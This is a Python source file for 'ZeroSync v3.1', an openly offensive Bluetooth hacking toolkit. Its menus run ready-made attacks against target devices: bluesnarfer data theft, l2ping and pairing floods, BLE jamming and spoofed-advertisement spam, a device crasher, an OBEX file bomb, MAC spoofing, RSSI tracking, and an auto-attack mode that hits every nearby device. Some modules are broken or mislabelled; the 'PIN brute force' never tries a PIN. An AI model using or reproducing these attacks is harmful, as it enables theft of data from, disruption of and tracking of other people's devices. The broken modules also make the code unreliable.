#!/usr/bin/env python3
# ZeroSync v3.1 - Bluetooth Hacking Toolkit with Upgraded UI
# Author: Niko DeRuise
# For educational use only

import os
import re
import subprocess
import sys
import time
import shutil
from datetime import datetime
from rich import print
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, IntPrompt

console = Console()
log_dir = "zerosync_logs"
os.makedirs(log_dir, exist_ok=True)

def log_output(name, content):
    with open(os.path.join(log_dir, f"{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"), 'w') as f:
        f.write(content)

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True).strip()
    except subprocess.CalledProcessError as e:
        return e.output.strip()

def get_adapter():
    out = run_cmd("hciconfig")
    matches = re.findall(r'(hci\d+):\s+Type', out)
    return matches[0] if matches else None

def enable_adapter(hci):
    run_cmd(f"rfkill unblock bluetooth")
    run_cmd(f"hciconfig {hci} up")

# === Core Menu Framework ===
def category_menu(title, options):
    while True:
        console.clear()
        table = Table(title=f"[bold cyan]{title}[/bold cyan]")
        table.add_column("ID", style="bold magenta")
        table.add_column("Action")
        for key, desc in options.items():
            table.add_row(str(key), desc[0])
        table.add_row("0", "Back to Main Menu")
        console.print(table)
        choice = Prompt.ask("[bold green]Select an option[/bold green]")
        if choice == "0":
            break
        elif choice in options:
            options[choice][1]()
        else:
            console.print("[red]Invalid choice.[/red]")
            time.sleep(1)

# === Classic Bluetooth Attacks ===
def scan_devices():
    out = run_cmd("hcitool scan")
    print(out)
    log_output("classic_scan", out)

def bluesnarf():
    target = Prompt.ask("Target MAC")
    out = run_cmd(f"bluesnarfer -b {target} -r 1-100")
    print(out)
    log_output("bluesnarf", out)

def bluebug():
    target = Prompt.ask("Target MAC")
    out = run_cmd(f"sdptool browse {target}")
    print(out)
    log_output("bluebug", out)

def bt_dos():
    target = Prompt.ask("Target MAC")
    out = run_cmd(f"l2ping -i 0 -s 600 -f {target}")
    print(out)
    log_output("bt_dos", out)

def blueflood():
    target = Prompt.ask("Target MAC")
    for i in range(25):
        run_cmd(f"hcitool cc {target}")
        run_cmd(f"hcitool auth {target}")
    print("[cyan]Flood completed.[/cyan]")
    log_output("blueflood", f"Flooded {target} 25 times")

# === BLE Attacks ===
def ble_scan():
    out = run_cmd("hcitool lescan --duplicates --passive")
    print(out)
    log_output("ble_scan", out)

def ble_adv_spoof():
    name = Prompt.ask("Fake BLE device name")
    out = run_cmd(f"bleah -A -n '{name}'")
    print(out)
    log_output("ble_adv_spoof", out)

def ble_sniff():
    out = run_cmd("btlejack -s")
    print(out)
    log_output("ble_sniff", out)

def ble_jam():
    out = run_cmd("btlejack -j")
    print(out)
    log_output("ble_jam", out)

def ble_crasher():
    target = Prompt.ask("Target MAC")
    out = run_cmd(f"bleah -b {target} -c crash")
    print(out)
    log_output("ble_crasher", out)

def ble_mesh_spam():
    name = Prompt.ask("Spam BLE name")
    for i in range(15):
        run_cmd(f"bleah -A -n '{name}_{i}'")
    print("[cyan]Spam beacons sent.[/cyan]")
    log_output("ble_mesh_spam", "15 spam beacons sent")

# === Exploit Modules ===
def blueborne_scan():
    out = run_cmd("python3 blueborne-checker.py")
    print(out)
    log_output("blueborne", out)

def legacy_pin_bruteforce():
    target = Prompt.ask("Target MAC")
    wordlist = Prompt.ask("Path to PIN wordlist")
    try:
        with open(wordlist, 'r') as f:
            pins = f.read().splitlines()
        for pin in pins:
            out = run_cmd(f"l2ping -c 1 {target}")
            console.print(f"[yellow]Trying PIN {pin}[/yellow] => {out}")
    except Exception as e:
        print(f"[red]Error: {e}[/red]")

def obex_file_bomb():
    target = Prompt.ask("Target MAC")
    file_path = Prompt.ask("File to send")
    out = run_cmd(f"obexftp --nopath --noconn --uuid none --bluetooth {target} --channel 9 -p {file_path}")
    print(out)
    log_output("obex_bomb", out)

def auto_attack_scanner():
    out = run_cmd("hcitool scan")
    print(out)
    targets = re.findall(r'((?:[0-9A-F]{2}:){5}[0-9A-F]{2})', out)
    for t in targets:
        console.print(f"[cyan]Attacking: {t}[/cyan]")
        run_cmd(f"l2ping -c 1 {t}")
        run_cmd(f"bluesnarfer -b {t} -r 1-20")
        run_cmd(f"sdptool browse {t}")
    log_output("auto_attack", out)

# === Utility Functions ===
def mac_spoof():
    iface = get_adapter()
    new_mac = Prompt.ask("Spoofed MAC")
    run_cmd(f"hciconfig {iface} down")
    out = run_cmd(f"bdaddr -i {iface} {new_mac}")
    run_cmd(f"hciconfig {iface} up")
    print(out)
    log_output("mac_spoof", out)

def vendor_lookup():
    mac = Prompt.ask("MAC Address")
    oui = mac.upper().replace(":", "")[:6]
    out = run_cmd(f"grep {oui} /usr/share/ieee-data/oui.txt")
    print(out if out else "[yellow]Vendor not found.[/yellow]")

def monitor_connections():
    out = run_cmd("hcitool con")
    print(out)
    log_output("connections", out)

def reset_bt():
    iface = get_adapter()
    run_cmd(f"hciconfig {iface} down")
    time.sleep(1)
    run_cmd(f"hciconfig {iface} up")
    print("[green]Bluetooth adapter reset.[/green]")

def tool_checker():
    tools = ["hcitool", "l2ping", "bdaddr", "bleah", "btlejack", "bluesnarfer", "gatttool", "obexftp"]
    table = Table(title="Tool Checker")
    table.add_column("Tool")
    table.add_column("Available")
    for tool in tools:
        status = "✅" if shutil.which(tool) else "❌"
        table.add_row(tool, status)
    console.print(table)

def rssi_tracker():
    target = Prompt.ask("Target MAC")
    try:
        while True:
            out = run_cmd(f"hcitool rssi {target}")
            print(out)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[yellow]Stopped.[/yellow]")

# === Main Menu and Categories ===
def main_menu():
    iface = get_adapter()
    if not iface:
        console.print("[red]No Bluetooth adapter found.[/red]")
        return
    enable_adapter(iface)

    while True:
        console.clear()
        console.print("[bold magenta]ZeroSync v3.1 - Bluetooth Hacking Toolkit[/bold magenta]\n")
        table = Table(title="Main Menu")
        table.add_column("ID", style="bold green")
        table.add_column("Category")
        table.add_row("1", "Classic Bluetooth Attacks")
        table.add_row("2", "BLE Attacks")
        table.add_row("3", "Exploit Modules")
        table.add_row("4", "Utilities & Tools")
        table.add_row("0", "Exit")
        console.print(table)

        choice = Prompt.ask("Select a category")
        if choice == "1":
            category_menu("Classic Bluetooth Attacks", {
                "1": ("Scan Devices", scan_devices),
                "2": ("BlueSnarf", bluesnarf),
                "3": ("BlueBug", bluebug),
                "4": ("DoS (l2ping flood)", bt_dos),
                "5": ("Pairing Flood", blueflood)
            })
        elif choice == "2":
            category_menu("BLE Attacks", {
                "1": ("BLE Scan", ble_scan),
                "2": ("Advert Spoof", ble_adv_spoof),
                "3": ("Sniff (btlejack)", ble_sniff),
                "4": ("Jamming", ble_jam),
                "5": ("BLE Crasher", ble_crasher),
                "6": ("Mesh Spam", ble_mesh_spam)
            })
        elif choice == "3":
            category_menu("Exploit Modules", {
                "1": ("BlueBorne Scanner", blueborne_scan),
                "2": ("Legacy PIN Brute Force", legacy_pin_bruteforce),
                "3": ("OBEX File Bomb", obex_file_bomb),
                "4": ("Auto Attack Scanner", auto_attack_scanner)
            })
        elif choice == "4":
            category_menu("Utilities & Tools", {
                "1": ("MAC Spoof", mac_spoof),
                "2": ("Vendor Lookup", vendor_lookup),
                "3": ("Monitor Connections", monitor_connections),
                "4": ("Reset Adapter", reset_bt),
                "5": ("Tool Checker", tool_checker),
                "6": ("RSSI Tracker", rssi_tracker)
            })
        elif choice == "0":
            console.print("[bold cyan]Goodbye.[/bold cyan]")
            break
        else:
            console.print("[red]Invalid option.[/red]")
            time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        console.print("[red]Run this script with sudo.[/red]")
        sys.exit(1)
    main_menu()